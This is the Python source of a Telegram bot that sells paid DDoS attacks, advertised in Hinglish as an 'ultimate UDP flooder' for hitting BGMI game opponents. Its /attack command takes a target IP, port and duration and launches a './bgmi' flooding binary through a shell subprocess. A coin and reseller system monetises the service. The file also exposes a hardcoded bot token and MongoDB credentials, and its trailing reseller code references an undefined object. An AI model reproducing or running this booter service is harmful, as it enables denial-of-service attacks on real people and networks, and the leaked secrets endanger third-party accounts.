import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

bot_start_time = datetime.now()
attack_in_progress = False
current_attack = None  # Store details of the current attack
attack_history = []  # Store attack logs

TELEGRAM_BOT_TOKEN = '7326172590:AAF-m0nnmtHZTh7AncZjDv_vxzFc1uexW6I'  # Replace with your bot token
ADMIN_USER_IDS = [757915155, 5056902784]  # Admin user IDs list
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "ninjadaksh"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO Bot Owner ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
        "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n"
        "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
        "*⚠️ Kaise Use Kare? ⚠️*\n"
        "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
        "*💬 Queries or Issues? 💬*\n"
        "*Contact Admin: Bot Owner*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def mahakal(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id not in ADMIN_USER_IDS:
        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /mahakal <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time, bot_start_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- Bot Owner*",
            parse_mode='Markdown'
        )
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.now()).total_seconds()
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
            parse_mode='Markdown'
        )
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
                "*👉 /attack <ip> <port> <duration>*\n"
                "*📌 Example: /attack 192.168.1.1 26547 240*"
            ),
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Check for restricted ports
    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*"
            ),
            parse_mode='Markdown'
        )
        return

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
                "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
            ),
            parse_mode='Markdown'
        )
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
            f"*💣 Target IP: {ip}*\n"
            f"*🔢 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
            f"*📉 Remaining Balance: {new_balance}*\n\n"
            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    attack_in_progress = True

    try:
        command = f"./bgmi {ip} {port} {duration} {13} {600}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*",
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ [ATTACK FINISHED] ✅*\n\n"
                f"*💣 Target IP: {ip}*\n"
                f"*🔢 Port: {port}*\n"
                f"*🕒 Duration: {duration} seconds*\n\n"
                "*💥 Attack complete! Ab chill kar aur feedback bhej! 🚀*"
            ),
            parse_mode='Markdown'
        )

async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user = await get_user(chat_id)
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"**Your Info:**\n\nCoins: {user['coins']}\n\nYou can attack by spending {COINS_REQUIRED_PER_ATTACK} coins.",
        parse_mode='Markdown'
    )

async def help(update: Update, context: CallbackContext):
    help_message = (
        "*📝 Here's a list of available commands:*\n\n"
        "*🆘 /start* - To start using the bot.\n"
        "*🛡️ /mahakal <add|rem> <user_id> <coins>* - Add or remove coins from a user (Admin only).\n"
        "*⚔️ /attack <ip> <port> <duration>* - Start a DDoS attack (coins required).\n"
        "*💼 /myinfo* - To check your coin balance.\n"
        "*⏱️ /uptime* - To check bot's uptime.\n"
        "*📜 /help* - To see this help message."
    )
    await context.bot.send_message(update.effective_chat.id, text=help_message, parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    # Only allow the admins to use the broadcast command
    if chat_id not in ADMIN_USER_IDS:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*🖕 Chal nikal! Teri aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*",
            parse_mode='Markdown'
        )
        return

    # Ensure the message is provided
    if not context.args:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Message nahi diya! Use: /broadcast <message>*",
            parse_mode='Markdown'
        )
        return

    # Get the broadcast message
    broadcast_message = " ".join(context.args)

    # Fetch all users from MongoDB
    users_cursor = users_collection.find()
    user_data = await users_cursor.to_list(length=None)

    # Send the broadcast message to each user
    for user in user_data:
        user_id = user.get("user_id")
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=broadcast_message,
                parse_mode='Markdown'
            )
        except Exception as e:
            # Log failed message sends
            print(f"Failed to send broadcast to {user_id}: {str(e)}")

    # Notify the admin that the broadcast is complete
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*✅ Broadcast complete! Message sent to {len(user_data)} users.*",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Adding the /mahakal command handler
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("mahakal", mahakal))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("broadcast", broadcast))  # Add the /broadcast handler
    
    application.run_polling()

if __name__ == '__main__':
    main()

# Reseller System Start

async def set_reseller(update: Update, context: CallbackContext):
    """Admin can grant reseller access."""
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id not in ADMIN_USER_IDS:
        await context.bot.send_message(chat_id=chat_id, text="🛑 Only admins can set resellers.")
        return

    if len(args) != 2 or args[0] not in ["add", "remove"]:
        await context.bot.send_message(chat_id=chat_id, text="Usage: /reseller <add|remove> <user_id>")
        return

    command, target_user_id = args
    target_user_id = int(target_user_id)

    if command == "add":
        await users_collection.update_one({"user_id": target_user_id}, {"$set": {"reseller": True}}, upsert=True)
        await context.bot.send_message(chat_id=chat_id, text=f"✅ User {target_user_id} is now a reseller.")
    elif command == "remove":
        await users_collection.update_one({"user_id": target_user_id}, {"$set": {"reseller": False}}, upsert=True)
        await context.bot.send_message(chat_id=chat_id, text=f"❌ User {target_user_id} is no longer a reseller.")

async def add_user(update: Update, context: CallbackContext):
    """Reseller can add users but not grant reseller access."""
    chat_id = update.effective_chat.id
    args = context.args

    user = await users_collection.find_one({"user_id": chat_id})
    if not user or not user.get("reseller", False):
        await context.bot.send_message(chat_id=chat_id, text="🛑 Only resellers or admins can add users.")
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="Usage: /adduser <user_id>")
        return

    target_user_id = int(args[0])
    await users_collection.update_one({"user_id": target_user_id}, {"$set": {"coins": 0}}, upsert=True)

    # Send notification to the Telegram group
    await context.bot.send_message(--1002464533692, text=f"📢 Reseller {chat_id} added a new user: {target_user_id}")

    await context.bot.send_message(chat_id=chat_id, text=f"✅ User {target_user_id} added successfully.")

    # Send reseller notification to the reseller group
    await context.bot.send_message(chat_id=-4616371010, text=f"📢 Reseller {chat_id} added a new user: {target_user_id}")


# Add handlers for reseller system
application.add_handler(CommandHandler("reseller", set_reseller))
application.add_handler(CommandHandler("adduser", add_user))

# Reseller System End
